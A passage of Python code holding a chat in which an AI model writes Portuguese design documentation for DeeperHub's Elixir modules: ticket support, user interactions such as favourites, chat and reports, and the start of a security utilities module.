*(O `DefaultSupportService` e `SupportAdapter` da documentação original são consolidados no `SupportService` e na fachada `Support`)*

### 3.3. Decisões de Design Importantes

*   **Ciclo de Vida do Ticket:** Definir claramente os diferentes status de um ticket e as transições permitidas entre eles.
*   **Comunicação Clara:** Manter um histórico claro de todas as mensagens trocadas entre o usuário e a equipe de suporte dentro do ticket.
*   **Notificações Eficazes:** Notificar as partes corretas no momento certo sobre atualizações nos tickets.
*   **Métricas de Suporte:** Rastrear métricas chave (tempo de primeira resposta, tempo de resolução) é vital para a qualidade do serviço.

## 🛠️ 4. Casos de Uso Principais

*   **Usuário Cria um Novo Ticket de Suporte:**
    *   Usuário preenche formulário na seção de ajuda.
    *   API chama `DeeperHub.Support.create_ticket(user_id, ticket_attrs)`.
    *   Serviço valida dados, sanitiza, persiste. Notifica o usuário da criação e a equipe de suporte sobre o novo ticket.
*   **Agente de Suporte Responde a um Ticket:**
    *   Agente visualiza o ticket em seu painel.
    *   Escreve uma resposta e atualiza o status (ex: para \"Aguardando Resposta do Usuário\").
    *   API chama `DeeperHub.Support.add_message_to_ticket(agent_id, ticket_id, message_content)` e `DeeperHub.Support.update_ticket_status(ticket_id, new_status, agent_id)`.
    *   Notifica o usuário sobre a nova resposta.
*   **Ticket é Resolvido:**
    *   Após a solução do problema, o agente ou o usuário marca o ticket como resolvido.
    *   API chama `DeeperHub.Support.update_ticket_status(ticket_id, :resolved, agent_or_user_id)`.
    *   (Opcional) Envia uma pesquisa de satisfação.

## 🌊 5. Fluxos Importantes

### Fluxo de Criação e Primeira Resposta de um Ticket

1.  **Usuário (UI):** Submete o formulário de novo ticket.
2.  **Controller API:** Chama `DeeperHub.Support.create_ticket(current_user.id, params[\"ticket\"])`.
3.  **`SupportService.create_ticket/2`:**
    *   Verifica rate limit (via `RateLimitIntegration`).
    *   Valida e sanitiza `params[\"ticket\"]` (via `Shared.ContentValidation`).
    *   Cria um `SupportTicketSchema` changeset.
    *   Se válido, `Core.Repo.insert(changeset)`.
    *   Se sucesso:
        *   Chama `NotificationIntegration.notify_ticket_created(ticket, user_id)` -> que usa `DeeperHub.Notifications`.
        *   Publica evento `support.ticket.created` via `Core.EventBus`.
        *   Audita.
        *   Retorna `{:ok, ticket_struct}`.
4.  **Equipe de Suporte (UI Painel):** Vê o novo ticket.
5.  **Agente de Suporte:** Abre o ticket, escreve uma resposta.
6.  **Controller API (Painel Admin):** Chama `DeeperHub.Support.add_message_to_ticket(current_agent.id, ticket_id, message_params)` e depois `DeeperHub.Support.update_ticket_status(ticket_id, :in_progress, current_agent.id)`.
7.  **`SupportService`:**
    *   Valida e sanitiza a mensagem.
    *   Cria um `TicketMessageSchema` associado ao ticket.
    *   Atualiza o status do `SupportTicketSchema`.
    *   Chama `NotificationIntegration.notify_ticket_replied(ticket, new_message_data)` para notificar o usuário.
    *   Publica eventos e audita.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Support`)

### 6.1. `DeeperHub.Support.create_ticket(user_id :: String.t() | nil, attrs :: map()) :: {:ok, SupportTicket.t()} | {:error, Ecto.Changeset.t() | term()}`

*   **Descrição:** Cria um novo ticket de suporte. `user_id` pode ser `nil` se tickets anônimos forem permitidos.
*   **`attrs`:** `%{subject: String.t(), description: String.t(), category_id: String.t() | nil, priority_id: String.t() | nil, attachments: list(map()) | nil}`.

### 6.2. `DeeperHub.Support.get_ticket(ticket_id :: String.t(), opts :: keyword()) :: {:ok, SupportTicketView.t() | nil}`

*   **Descrição:** Obtém os detalhes de um ticket, incluindo suas mensagens.
*   **`SupportTicketView.t()`:** Struct do ticket com `messages` pré-carregadas e informações de usuário/agente.
*   **`opts`:** `:requesting_user_id` (para verificar permissão de visualização).

### 6.3. `DeeperHub.Support.list_tickets(filters :: map(), opts :: keyword()) :: {:ok, list(SupportTicketListItem.t()), Pagination.t()}` (Admin/Suporte)

*   **Descrição:** Lista tickets para a equipe de suporte.
*   **`filters`:** `:status`, `:priority_id`, `:category_id`, `:assigned_agent_id`, `:user_email_contains`.
*   **`SupportTicketListItem.t()`:** Uma visão resumida do ticket.

### 6.4. `DeeperHub.Support.list_user_tickets(user_id :: String.t(), filters :: map(), opts :: keyword()) :: {:ok, list(SupportTicketListItem.t()), Pagination.t()}`

*   **Descrição:** Lista os tickets de um usuário específico.
*   **`filters`:** `:status`.

### 6.5. `DeeperHub.Support.add_message_to_ticket(actor_id :: String.t(), ticket_id :: String.t(), message_attrs :: map()) :: {:ok, TicketMessage.t()} | {:error, Ecto.Changeset.t() | :unauthorized | :ticket_closed}`

*   **Descrição:** Adiciona uma nova mensagem a um ticket existente.
*   **`actor_id`:** ID do usuário ou agente de suporte que está adicionando a mensagem.
*   **`message_attrs`:** `%{content: String.t(), attachments: list(map()) | nil, is_internal_note: boolean() | false}`.

### 6.6. `DeeperHub.Support.update_ticket_status(ticket_id :: String.t(), new_status :: atom(), actor_id :: String.t(), opts :: keyword()) :: {:ok, SupportTicket.t()} | {:error, :invalid_transition | term()}`

*   **Descrição:** Atualiza o status de um ticket.
*   **`new_status`:** Ex: `:open`, `:in_progress`, `:awaiting_user`, `:resolved`, `:closed`.
*   **`opts`:** `:resolution_notes` (String.t) se o status for `:resolved`.

### 6.7. `DeeperHub.Support.assign_ticket(ticket_id :: String.t(), agent_id :: String.t(), assigning_admin_id :: String.t()) :: {:ok, SupportTicket.t()} | {:error, term()}` (Nova Sugestão)

*   **Descrição:** Atribui um ticket a um agente de suporte.

### 6.8. `DeeperHub.Support.get_ticket_categories() :: {:ok, list(TicketCategory.t())}` (Nova Sugestão)
### 6.9. `DeeperHub.Support.get_ticket_priorities() :: {:ok, list(TicketPriority.t())}` (Nova Sugestão)

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:support, :enabled]`** (Boolean): Habilita/desabilita o sistema de suporte.
*   **`[:support, :allow_anonymous_tickets]`** (Boolean): Permite que visitantes não logados criem tickets. (Padrão: `false`)
*   **`[:support, :default_priority_id]`** (String): ID da prioridade padrão para novos tickets.
*   **`[:support, :default_category_id]`** (String): ID da categoria padrão.
*   **`[:support, :max_description_length]`** (Integer): Comprimento máximo da descrição do ticket.
*   **`[:support, :max_attachments_per_ticket]`** (Integer).
*   **`[:support, :max_attachment_size_mb]`** (Integer).
*   **`[:support, :auto_close_resolved_tickets_after_days]`** (Integer | nil): Dias para fechar automaticamente tickets resolvidos sem resposta do usuário.
*   **`[:support, :sla, :first_response_hours, <priority_id>]`** (Integer): SLA de primeira resposta por prioridade.
*   **`[:support, :sla, :resolution_hours, <priority_id>]`** (Integer): SLA de resolução por prioridade.
*   **`[:support, :notification, :notify_user_on_creation]`** (Boolean).
*   **`[:support, :notification, :notify_agent_on_assignment]`** (Boolean).
*   **`[:support, :notification, :notify_user_on_reply]`** (Boolean).
*   **`[:support, :notification, :support_team_email_group]`** (String): Email do grupo de suporte para notificações de novos tickets.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.*`: Todos os módulos Core.
*   `DeeperHub.Accounts`: Para `user_id` e informações do usuário.
*   `DeeperHub.Auth`/`RBAC`: Para permissões de agentes e admins.
*   `DeeperHub.Notifications`: Para todas as notificações de ticket.
*   `DeeperHub.Services.Shared.ContentValidation`: Para validar e sanitizar conteúdo.
*   `DeeperHub.Support.RateLimitIntegration`.
*   Um serviço de Armazenamento de Arquivos (se houver anexos).
*   `DeeperHub.Audit`.

### 8.2. Bibliotecas Externas

*   `Ecto`.

## 🤝 9. Como Usar / Integração

*   **Interface do Usuário (Seção de Ajuda/Suporte):**
    *   Formulário para `create_ticket`.
    *   Listagem para `list_user_tickets`.
    *   Visualização e adição de mensagens para `get_ticket` e `add_message_to_ticket`.
*   **Painel de Administração/Suporte:**
    *   Dashboard com `list_tickets` e filtros avançados.
    *   Funcionalidades para atribuir, atualizar status, responder e escalar tickets.
*   **Alertas do Sistema:** Outros módulos podem, em caso de erro persistente ou problema complexo, programaticamente criar um ticket de suporte em nome do usuário ou para a equipe interna.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o ciclo de vida completo de um ticket (criação, respostas, mudança de status, resolução, fechamento).
*   Testar a lógica de permissão (usuário só pode ver seus tickets, agente pode ver tickets atribuídos, etc.).
*   Testar a validação e sanitização de conteúdo.
*   Testar o envio de notificações em cada etapa.
*   Testar a funcionalidade de anexos.
*   Testar os workers (escalação, auto-fechamento).
*   Localização: `test/deeper_hub/support/`.

### 10.2. Métricas

*   `deeper_hub.support.tickets.created.count` (tags: `category_id`, `priority_id`, `channel` (`web`, `api`, `email`))
*   `deeper_hub.support.tickets.resolved.count` (tags: `category_id`)
*   `deeper_hub.support.tickets.closed.count`
*   `deeper_hub.support.tickets.status_changed.count` (tags: `from_status`, `to_status`)
*   `deeper_hub.support.tickets.messages_added.count` (tags: `actor_type` (`user`, `agent`))
*   `deeper_hub.support.tickets.avg_first_response_time_minutes.gauge` (Gauge, tags: `priority_id`)
*   `deeper_hub.support.tickets.avg_resolution_time_hours.gauge` (Gauge, tags: `priority_id`)
*   `deeper_hub.support.tickets.open_tickets.gauge` (Gauge, tags: `priority_id`, `category_id`)

### 10.3. Logs

*   **Nível INFO:** Ticket criado, status alterado, mensagem adicionada.
*   **Nível WARNING:** SLA de primeira resposta ou resolução próximo de estourar. Tentativa de ação não permitida (ex: usuário tentando fechar ticket de outro).
*   **Nível ERROR:** Falha ao criar ticket, falha ao enviar notificação de ticket.

### 10.4. Telemetria

*   `[:deeper_hub, :support, :ticket, :created | :updated | :status_changed | :message_added]`
    *   Metadados: `%{ticket_id: id, user_id: id, agent_id: id, changes: map}`
*   `[:deeper_hub, :support, :sla, :breached]`
    *   Metadados: `%{ticket_id: id, sla_type: :first_response | :resolution, priority: prio}`

## ❌ 11. Tratamento de Erros

*   Falhas de validação ao criar/atualizar retornam `{:error, changeset}`.
*   Operações não autorizadas retornam `{:error, :unauthorized}`.
*   Tentativas de operar em tickets não existentes retornam `{:error, :not_found}`.
*   Falhas no envio de notificações são logadas, mas não devem impedir a operação principal no ticket.

## 🛡️ 12. Considerações de Segurança

*   **Sanitização de Conteúdo:** Todas as descrições e mensagens devem ser sanitizadas para prevenir XSS.
*   **Proteção de Anexos:** Anexos devem ser escaneados por vírus e ter seu tipo de conteúdo validado. O acesso a anexos deve ser controlado.
*   **Privacidade dos Dados do Ticket:** Apenas o autor do ticket, agentes atribuídos e administradores com permissão devem poder visualizar o conteúdo completo de um ticket.
*   **Não Incluir Dados Sensíveis Desnecessários:** Instruir usuários a não incluir senhas ou outros dados altamente sensíveis nos tickets. Se necessário, fornecer um canal seguro separado.

## 🧑‍💻 13. Contribuição

*   Mantenha a lógica de transição de status clara e bem definida.
*   Garanta que as notificações sejam relevantes e enviadas para as partes corretas.
*   Adicione testes para todos os novos fluxos e validações.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar uma Base de Conhecimento (FAQ) integrada e sugestão de artigos durante a criação do ticket.
*   [ ] Permitir que usuários avaliem a qualidade do suporte recebido após a resolução do ticket.
*   [ ] Funcionalidade de \"campos customizados\" para tickets, permitindo que administradores adicionem campos específicos para diferentes categorias de problemas.
*   [ ] Integração com email para que usuários possam responder a notificações de ticket por email e suas respostas sejam adicionadas ao ticket.
*   [ ] Atribuição automática de tickets a agentes com base em carga de trabalho, especialidade ou round-robin.
*   [ ] Relatórios mais detalhados para a equipe de suporte (desempenho de agentes, gargalos, etc.).
*   [ ] Suporte a \"tickets internos\" para comunicação entre equipes.

---

*Última atualização: 2025-05-12*

---

O sistema de suporte é outra peça importante para a satisfação do usuário.

Agora, o que acha de explorarmos `DeeperHub.UserInteractions` para ver como os usuários interagem socialmente na plataforma, ou talvez o `DeeperHub.OAuth` para detalhar a autenticação com provedores externos?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Excelente! Vamos continuar com o `DeeperHub.UserInteractions`. Este módulo é focado nas funcionalidades sociais e de interação entre os usuários da plataforma DeeperHub.

---

# Módulo: `DeeperHub.UserInteractions` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.UserInteractions`

O módulo `DeeperHub.UserInteractions` gerencia as **interações sociais e engajamentos entre os usuários** da plataforma DeeperHub, bem como as interações dos usuários com entidades como servidores. Ele abrange funcionalidades como seguir servidores, adicionar servidores aos favoritos, enviar mensagens privadas, dar feedback, fazer recomendações e reportar conteúdo ou usuários.

O objetivo deste módulo é enriquecer a experiência social na plataforma, permitir que os usuários se conectem, compartilhem opiniões e ajudem a manter a comunidade segura e relevante. 😊

*(Nota: Na documentação original, este era `DeeperHub.Services.UserInteractions`. Estamos tratando-o como um contexto de domínio mais amplo.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Favoritar Servidores (`add_favorite/2`, `remove_favorite/2`, `list_favorites/2`, `is_favorite?/2`):**
    *   Permitir que usuários marquem servidores como favoritos.
    *   Listar os servidores favoritos de um usuário.
    *   Verificar se um usuário favoritou um servidor específico.
*   **Seguir Servidores (Nova Sugestão, similar a favoritos mas com semântica de \"receber atualizações\"):**
    *   Permitir que usuários sigam servidores para receber notificações sobre suas atualizações ou eventos.
    *   Gerenciar a lista de seguidores de um servidor e servidores seguidos por um usuário.
*   **Mensagens Diretas entre Usuários (Chat) (`send_chat_message/1`, `list_chat_messages/3`):**
    *   Permitir que usuários enviem e recebam mensagens diretas uns dos outros.
    *   Manter o histórico de conversas.
    *   (Opcional) Indicação de status (online, offline, digitando).
    *   (Opcional) Notificações de novas mensagens.
*   **Recomendações de Servidores (`create_or_update_recommendation/1`, `list_recommendations_for_user/2`):**
    *   Permitir que usuários recomendem servidores para outros usuários ou para a comunidade.
    *   O sistema pode gerar recomendações automáticas com base no comportamento do usuário ou similaridade.
*   **Feedback sobre a Plataforma (`submit_feedback/1`, `list_feedback/1`):**
    *   Permitir que usuários enviem feedback geral sobre a plataforma DeeperHub (sugestões, bugs, usabilidade).
*   **Denúncias (Reports) de Conteúdo ou Usuários (`create_report/1`, `list_reports/1`):**
    *   Permitir que usuários denunciem servidores, reviews, mensagens de chat, ou outros usuários por comportamento inadequado ou violação das diretrizes.
    *   Gerenciar o fluxo de moderação dessas denúncias.
*   **Reações (Likes/Dislikes/Votos) em Conteúdo (Nova Sugestão, ou parte de cada módulo de conteúdo):**
    *   Permitir que usuários reajam (ex: curtir, dar um upvote/downvote) a reviews, mensagens de atualização de servidor, etc.
*   **Listas de Amigos/Conexões (Nova Sugestão):**
    *   Permitir que usuários adicionem outros como amigos ou conexões.
    *   Visualizar a atividade de amigos (com controle de privacidade).
*   **Observabilidade e Auditoria:**
    *   Logar e metrificar interações.
    *   Publicar eventos de domínio (ex: `user.favorited_server`, `chat.message_sent`).
    *   Auditar denúncias e ações de moderação.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.UserInteractions` (Fachada Pública):**
    *   Ponto de entrada para todas as operações de interação social.
    *   Delega para o `UserInteractionsService`.
2.  **`DeeperHub.UserInteractions.Services.UserInteractionsService` (ou `DefaultUserInteractionsService`):**
    *   **Responsabilidade:** Orquestra a lógica de negócio para as diferentes interações.
    *   **Interações:**
        *   `DeeperHub.Core.Repo`: Para CRUD com os schemas de interação (`FavoriteSchema`, `ChatMessageSchema`, `FeedbackSchema`, `RecommendationSchema`, `ReportSchema`, etc.).
        *   `DeeperHub.Accounts`: Para validar `user_id` e obter informações de usuário.
        *   `DeeperHub.Servers`: Para validar `server_id` ao favoritar/recomendar.
        *   `DeeperHub.Auth`/`RBAC`: Para verificar permissões (ex: se um usuário pode enviar mensagem para outro, se moderador pode ver denúncias).
        *   `DeeperHub.Notifications`: Para notificar usuários sobre novas mensagens, feedback respondido, etc.
        *   `DeeperHub.Core.EventBus`: Para publicar eventos de interação.
        *   `DeeperHub.Core.Cache`: Para cachear dados como listas de favoritos ou contagens de reações.
3.  **Schemas Ecto:**
    *   **`DeeperHub.UserInteractions.Schemas.FavoriteSchema`:** (`user_id`, `server_id`, `added_at`).
    *   **`DeeperHub.UserInteractions.Schemas.FollowSchema` (Nova):** (`follower_user_id`, `followed_entity_type` (ex: `:server`, `:user`), `followed_entity_id`, `followed_at`).
    *   **`DeeperHub.UserInteractions.Schemas.ChatMessageSchema`:** (`sender_id`, `receiver_id`, `content`, `sent_at`, `read_at`).
    *   **`DeeperHub.UserInteractions.Schemas.FeedbackSchema`:** (`user_id` (opcional), `type` (`:bug`, `:suggestion`, `:complaint`), `content`, `status` (`:new`, `:in_progress`, `:resolved`), `submitted_at`).
    *   **`DeeperHub.UserInteractions.Schemas.RecommendationSchema`:** (`recommender_user_id`, `recommended_server_id`, `target_user_id` (opcional, se for para um usuário específico), `reason`, `score` (opcional), `created_at`).
    *   **`DeeperHub.UserInteractions.Schemas.ReportSchema`:** (`reporter_user_id`, `reported_entity_type` (`:user`, `:server`, `:review`, `:chat_message`), `reported_entity_id`, `reason_category`, `details`, `status` (`:pending_review`, `:action_taken`, `:dismissed`), `submitted_at`).
    *   **`DeeperHub.UserInteractions.Schemas.ReactionSchema` (Nova):** (`user_id`, `target_entity_type`, `target_entity_id`, `reaction_type` (`:like`, `:dislike`, `:helpful`, etc.), `created_at`).
    *   **`DeeperHub.UserInteractions.Schemas.FriendshipSchema` (Nova):** (`user1_id`, `user2_id`, `status` (`:pending`, `:accepted`, `:blocked`), `requested_at`, `accepted_at`).
4.  **`DeeperHub.UserInteractions.Storage` (ou lógica no `UserInteractionsService`):**
    *   Encapsula as queries Ecto.
5.  **Workers (Opcional):**
    *   `NotificationDispatcherWorker`: Para enviar notificações de novas mensagens de chat ou outras interações de forma assíncrona.
    *   `ReportModerationQueueWorker`: Para processar denúncias e atribuí-las a moderadores.
    *   `RecommendationEngineWorker`: Para gerar recomendações automáticas em background.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/user_interactions/
├── user_interactions.ex              # Fachada Pública
│
├── services/
│   └── user_interactions_service.ex  # Serviço principal
│   # Potencialmente, serviços mais específicos: ChatService, ReportService, etc.
│
├── schemas/
│   ├── favorite_schema.ex
│   ├── follow_schema.ex
│   ├── chat_message_schema.ex
│   ├── feedback_schema.ex
│   ├── recommendation_schema.ex
│   ├── report_schema.ex
│   ├── reaction_schema.ex
│   └── friendship_schema.ex
│
├── storage.ex                        # (Opcional)
│
├── workers/                          # Opcional
│   ├── notification_dispatcher_worker.ex
│   └── report_moderation_queue_worker.ex
│
├── supervisor.ex
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Privacidade:** As interações, especialmente mensagens diretas e denúncias, devem ser tratadas com alta consideração pela privacidade.
*   **Moderação:** Um sistema robusto de moderação é essencial para denúncias e, potencialmente, para outro conteúdo gerado pelo usuário que possa surgir de interações.
*   **Escalabilidade do Chat:** Se o chat for uma feature principal, pode precisar de uma arquitetura mais especializada (ex: usando Phoenix Channels, um backend de mensagens dedicado) em vez de simples armazenamento no DB.
*   **Notificações Granulares:** Os usuários devem poder controlar quais tipos de notificações de interação eles recebem.

## 🛠️ 4. Casos de Uso Principais

*   **Usuário Favorita um Servidor:**
    *   Na página do servidor, usuário clica em \"Favoritar\".
    *   API chama `UserInteractions.add_favorite(user_id, server_id)`.
*   **Usuário Envia uma Mensagem Direta para Outro Usuário:**
    *   Na interface de chat, usuário_A envia \"Olá!\" para usuário_B.
    *   API chama `UserInteractions.send_chat_message(%{sender_id: \"A\", receiver_id: \"B\", content: \"Olá!\"})`.
    *   O sistema envia uma notificação (push/in-app) para usuário_B.
*   **Usuário Denuncia uma Review de Servidor:**
    *   Usuário clica em \"Denunciar\" em uma review.
    *   Preenche motivo e detalhes.
    *   API chama `UserInteractions.create_report(%{reporter_user_id: \"uid\", reported_entity_type: :review, reported_entity_id: \"review_id\", ...})`.
    *   Uma notificação é enviada para a equipe de moderação.
*   **Sistema Sugere um Servidor para um Usuário:**
    *   `RecommendationEngineWorker` analisa o histórico do usuário.
    *   Chama `UserInteractions.create_or_update_recommendation(%{recommender_user_id: \"system\", recommended_server_id: \"server_xyz\", target_user_id: \"uid\", reason: \"Baseado em seus favoritos\"})`.

## 🌊 5. Fluxos Importantes

### Fluxo de Envio de Mensagem de Chat

1.  **Usuário A (UI):** Envia a mensagem \"Olá!\" para Usuário B.
2.  **Controller API:** Recebe a requisição. Chama `DeeperHub.UserInteractions.send_chat_message(%{sender_id: \"A\", receiver_id: \"B\", content: \"Olá!\"})`.
3.  **`UserInteractionsService.send_chat_message/1`:**
    *   Valida se o remetente pode enviar mensagem para o destinatário (ex: não bloqueado, ambos existem).
    *   Sanitiza o `content` (via `Shared.ContentValidation`).
    *   Cria um `ChatMessageSchema` changeset.
    *   Persiste a mensagem via `Core.Repo.insert(changeset)`.
    *   Se sucesso:
        *   Enfileira uma notificação para o `receiver_id` (via `DeeperHub.Notifications`, possivelmente por um `NotificationDispatcherWorker` para não bloquear).
        *   Publica evento `chat.message_sent` no `Core.EventBus`.
        *   Retorna `{:ok, chat_message_struct}`.
4.  **Usuário B:** Recebe a notificação (push ou in-app) e sua UI de chat é atualizada.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.UserInteractions`)

### 6.1. Favoritos e Seguir

*   `add_favorite(user_id, server_id)`
*   `remove_favorite(user_id, server_id)`
*   `list_user_favorites(user_id, opts)`
*   `is_favorite?(user_id, server_id)`
*   `follow_server(user_id, server_id)` (Nova)
*   `unfollow_server(user_id, server_id)` (Nova)
*   `list_user_followed_servers(user_id, opts)` (Nova)

### 6.2. Mensagens de Chat

*   `send_chat_message(attrs :: %{sender_id: String.t(), receiver_id: String.t(), content: String.t()})`
*   `list_chat_messages(user_id_A :: String.t(), user_id_B :: String.t(), opts :: keyword())`
*   `mark_chat_messages_as_read(user_id_viewer :: String.t(), other_user_id :: String.t(), up_to_message_id :: String.t() | nil)` (Nova)

### 6.3. Recomendações

*   `create_or_update_recommendation(attrs :: %{recommender_user_id: String.t(), recommended_server_id: String.t(), target_user_id: String.t() | nil, reason: String.t(), score: float() | nil})`
*   `list_recommendations_for_user(user_id, opts)`
*   `list_recommendations_from_user(user_id, opts)` (Nova)

### 6.4. Feedback da Plataforma

*   `submit_feedback(attrs :: %{user_id: String.t() | nil, type: atom(), content: String.t(), contact_email: String.t() | nil})`
*   `list_feedback(filters, opts)` (Admin)
*   `update_feedback_status(feedback_id, new_status, admin_id)` (Admin)

### 6.5. Denúncias (Reports)

*   `create_report(attrs :: %{reporter_user_id: String.t(), reported_entity_type: atom(), reported_entity_id: String.t(), reason_category: String.t(), details: String.t()})`
*   `list_reports(filters, opts)` (Admin/Moderador)
*   `update_report_status(report_id, new_status, moderator_id, action_taken_notes :: String.t() | nil)` (Admin/Moderador)

### 6.6. Reações (Nova API Sugerida)

*   `add_reaction(user_id, target_entity_type, target_entity_id, reaction_type)`
*   `remove_reaction(user_id, target_entity_type, target_entity_id, reaction_type)`
*   `get_reactions_for_entity(target_entity_type, target_entity_id)` (Retorna contagens por tipo de reação)

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:user_interactions, :chat, :enabled]`** (Boolean).
*   **`[:user_interactions, :chat, :max_message_length]`** (Integer).
*   **`[:user_interactions, :favorites, :max_per_user]`** (Integer).
*   **`[:user_interactions, :reports, :categories]`** (List de Strings): Categorias de denúncia permitidas.
*   **`[:user_interactions, :reports, :notify_moderators_on_new_report]`** (Boolean).
*   **`[:user_interactions, :feedback, :allowed_types]`** (List de Atoms).
*   **`[:user_interactions, :recommendations, :max_user_recommendations]`** (Integer).
*   **`[:user_interactions, :rate_limit, <action>, :limit | :window_seconds]`**: Configs de rate limit para ações como `send_chat_message`, `create_report`.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.*`: Todos os módulos Core.
*   `DeeperHub.Accounts`: Para `user_id` e perfis de usuário.
*   `DeeperHub.Servers`: Para `server_id` em favoritos, recomendações, denúncias.
*   `DeeperHub.Auth`/`RBAC`: Para permissões (ex: quem pode ver/gerenciar denúncias).
*   `DeeperHub.Notifications`: Para notificar sobre novas mensagens, status de denúncias, etc.
*   `DeeperHub.Services.Shared.ContentValidation`: Para validar e sanitizar conteúdo de mensagens, feedback, denúncias.
*   `DeeperHub.Audit`.

### 8.2. Bibliotecas Externas

*   `Ecto`.
*   Se o chat for em tempo real, `Phoenix.PubSub` ou `Phoenix.Presence` podem ser usados internamente.

## 🤝 9. Como Usar / Integração

*   **UI do Usuário:** Várias seções da UI (perfil do servidor, perfil do usuário, chat, central de ajuda) chamarão endpoints da API que usam este módulo.
*   **Painel de Moderação/Administração:** Para visualizar e gerenciar denúncias e feedback.
*   **Sistema de Notificações:** O `UserInteractionsService` frequentemente chamará `DeeperHub.Notifications` para informar usuários sobre novas mensagens, respostas a feedback, status de denúncias, etc.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar cada funcionalidade principal: favoritos, chat (envio, listagem), feedback, recomendações, denúncias.
*   Testar a lógica de permissão (ex: usuário não pode ver chat de outros, apenas moderador vê todas as denúncias).
*   Testar validação e sanitização de conteúdo.
*   Testar a interação com notificações.
*   Localização: `test/deeper_hub/user_interactions/`.

### 10.2. Métricas

*   `deeper_hub.user_interactions.favorites.added.count`
*   `deeper_hub.user_interactions.chat_messages.sent.count`
*   `deeper_hub.user_interactions.feedback.submitted.count` (tags: `type`)
*   `deeper_hub.user_interactions.reports.created.count` (tags: `entity_type`, `reason_category`)
*   `deeper_hub.user_interactions.recommendations.created.count`
*   `deeper_hub.user_interactions.reactions.added.count` (tags: `entity_type`, `reaction_type`)

### 10.3. Logs

*   **Nível INFO:** Nova interação criada (favorito, mensagem, feedback, denúncia).
*   **Nível WARNING:** Tentativa de ação não permitida (ex: enviar mensagem para usuário bloqueado). Denúncia recebida para conteúdo/usuário.
*   **Nível ERROR:** Falha ao persistir uma interação.

### 10.4. Telemetria

*   `[:deeper_hub, :user_interactions, <interaction_type>, :created | :deleted]`
    *   Ex: `[:deeper_hub, :user_interactions, :favorite, :created]`
    *   Metadados: `%{user_id: id, target_id: id_if_applicable, details: ...}`
*   `[:deeper_hub, :user_interactions, :report, :status_changed]`
    *   Metadados: `%{report_id: id, new_status: status, moderator_id: id}`

## ❌ 11. Tratamento de Erros

*   Falhas de validação retornam `{:error, changeset}`.
*   Operações não autorizadas retornam `{:error, :unauthorized}`.
*   Erros ao enviar notificações são logados, mas a interação principal (ex: envio de mensagem) deve ser bem-sucedida se possível.

## 🛡️ 12. Considerações de Segurança

*   **Privacidade das Mensagens de Chat:** Mensagens diretas devem ser confidenciais e acessíveis apenas pelos participantes e, em casos específicos, por administradores/moderadores com justificativa (ex: investigação de denúncia). Criptografia de ponta-a-ponta é uma consideração avançada se a privacidade for extrema.
*   **Sanitização de TODO Conteúdo:** Todo conteúdo gerado pelo usuário (mensagens, feedback, detalhes de denúncia) deve ser rigorosamente sanitizado.
*   **Abuso de Denúncias:** O sistema de denúncias pode ser abusado. Implementar rate limiting e, potencialmente, um sistema de reputação para quem denuncia.
*   **Proteção contra Spam no Chat:** Limitar a frequência de mensagens ou o número de novas conversas que um usuário pode iniciar.

## 🧑‍💻 13. Contribuição

*   Mantenha a lógica de cada tipo de interação (favoritos, chat, etc.) o mais isolada possível dentro do `UserInteractionsService` ou em seus próprios submódulos de serviço se crescerem muito.
*   Garanta que os eventos e notificações apropriados sejam disparados.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar sistema de \"bloquear usuário\" para chat e outras interações.
*   [ ] Adicionar indicadores de \"digitando...\" e \"mensagem lida\" no chat.
*   [ ] Suporte para envio de mídias (imagens, vídeos curtos) em mensagens de chat.
*   [ ] \"Grupos de Amigos\" ou \"Comunidades de Servidor\" com chat em grupo.
*   [ ] Sistema de reputação para usuários baseado em suas interações e histórico de denúncias (feitas e recebidas).
*   [ ] Recomendações de servidores mais inteligentes usando ML com base no histórico de interações e favoritos de usuários similares.
*   [ ] Feed de atividades para o usuário (ex: \"Seu amigo X favoritou o servidor Y\", \"Nova review no seu servidor favorito Z\").

---

*Última atualização: 2025-05-12*

---

Este módulo de interações é bem rico e pode crescer bastante com funcionalidades sociais!

Onde vamos agora? Que tal `DeeperHub.Webhooks` para ver como o DeeperHub se comunica com sistemas externos, ou talvez `DeeperHub.Shared.Utils.ValidationUtils` para finalizar os utilitários?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue
"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, já detalhamos o `DeeperHub.Shared.Utils.ValidationUtils`.

Vamos agora finalizar os módulos de utilitários com o `DeeperHub.Shared.Utils.SecurityUtils`, que, embora já tenhamos tocado em alguns aspectos de segurança, este é focado em primitivas de segurança de baixo nível.

---

# Módulo: `DeeperHub.Shared.Utils.SecurityUtils` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Shared.Utils.SecurityUtils`

O módulo `DeeperHub.Shared.Utils.SecurityUtils` fornece um conjunto de **funções utilitárias de segurança de baixo nível e agnósticas de contexto**. Estas são ferramentas básicas que podem ser usadas por vários módulos de segurança ou outras partes do sistema para tarefas como geração de tokens aleatórios seguros, hashing de senhas (se não totalmente encapsulado em `Auth` ou `Core.EncryptionService`), e outras operações criptográficas simples e comparações seguras.

O objetivo é fornecer blocos de construção seguros e bem testados para funcionalidades de segurança mais complexas, evitando a reinvenção de primitivas criptográficas e promovendo o uso de práticas seguras em todo o sistema DeeperHub. 😊

